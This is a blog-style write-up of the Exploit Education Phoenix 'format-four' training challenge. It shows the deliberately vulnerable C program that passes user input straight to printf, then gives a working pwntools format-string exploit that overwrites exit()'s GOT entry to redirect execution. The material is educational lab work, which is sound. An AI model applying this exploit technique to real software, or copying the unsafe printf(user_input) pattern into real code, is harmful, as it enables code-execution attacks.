---
layout: post
title:  "Phoenix Format Four"
date:   2021-02-20 11:00:00 +0000
categories: ExploitEducation
---
# Phoenix Four
## Description:
Challange [Link](https://exploit.education/phoenix/format-four/) (arch: amd64)
```c
/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}
```

In this challenge, our goal is to call the local function `congratulations()`.

## Analyse
1. The vulnerable function `printf()` is present in function `bounce()`, and a `libc` function `exit()` is call at the end. So we can override the exit's GOT with the target function `congratulations()`.

2. The `congratulations` addess is "0x0000 0000 0040 0644", we need to write 4 times to get the result(+0, +2, +4, +6). Additionally, the most high values are 0x0000, the trick is to write the low half of "0x10000".


## Solution
1. Here is my solution:
    ```python
    from pwn import *

    p = process("/opt/phoenix/amd64/format-four")

    offset = 12
    paddings = 80
    exit_got = 0x6009f0

    payload = "%8x" * (offset - 2)
    payload += "%8x" * paddings
    payload += "%" + str(0x10040 - 8 * (paddings + offset - 2)) + "x"
    payload += "%hn"
    payload += "%" + str(0x10644 - 0x0040) + "x"
    payload += "%hn"
    payload += "%" + str(0x10000 - 0x0644) + "x"
    payload += "%hn%hn"
    payload += "A" * (8 * paddings - len(payload))
    payload += p64(exit_got+2)
    payload += 8 * "A"
    payload += p64(exit_got)
    payload += 8 * "A"
    payload += p64(exit_got+4)
    payload += p64(exit_got+6)

    print(p.recv())
    p.send(payload)

    p.interactive()
    ```